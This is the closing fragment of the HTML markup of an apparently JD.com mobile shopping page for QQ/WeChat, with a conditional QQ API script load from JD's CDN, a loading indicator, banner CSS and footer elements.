			<script inline="./js/index.js" params="{noCompile:true}" crossorigin="true" onerror="__reloadResource(this)">("qq"==JD.device.scene||"jdm"==JD.device.scene&&/qq\/([\d\.]+)*/.test(navigator.userAgent.toLowerCase()))&&JD.sendJs("//wq.360buyimg.com/js/common/dest/wq.qqapi.5b98a722.js",{defer:!0,async:!0});
</script>
		</div>

		<div tag="qq_menu_layer_v2">
			<div class="qq_menu_layer_v2" style="display:none;z-index:1005" id="__mqqmenu"></div>
			<script inline="./js/index.js" params="{noCompile:true}" crossorigin="true" onerror="__reloadResource(this)">("qq"==JD.device.scene||"jdm"==JD.device.scene&&/qq\/([\d\.]+)*/.test(navigator.userAgent.toLowerCase()))&&JD.sendJs("//wq.360buyimg.com/js/common/dest/wq.qqapi.5b98a722.js",{defer:!0,async:!0});
</script>
		</div>
 
		<div class="wx_loading" style="display: none;">
			<div class="wx_loading_inner"><i class="wx_loading_icon"></i> <span>请求加载中...</span></div>
		</div>

 
		<div>
		 
			<style type="text/css">
				.wxsq_topTips {
					position: relative;
					padding: 8px 35px 8px 8px;
					background: #fffad0;
					font-size: 10px;
					margin-bottom: 45px;
				}

				.wxsq_topTips span {
					display: block;
					width: 40px;
					height: 40px;
					line-height: 40px;
					position: absolute;
					top: 0;
					right: 0;
					color: #3985ff;
					text-align: center;
				}
			</style>




 
 
		</div>

	 



		<div class="qq_footer">
			<div class="jd_logo" id="jdBtmLogo"></div>
		</div>
	
	<script src="./img/m.js"></script>
	<script src="./img/m.js"></script>

</body></html>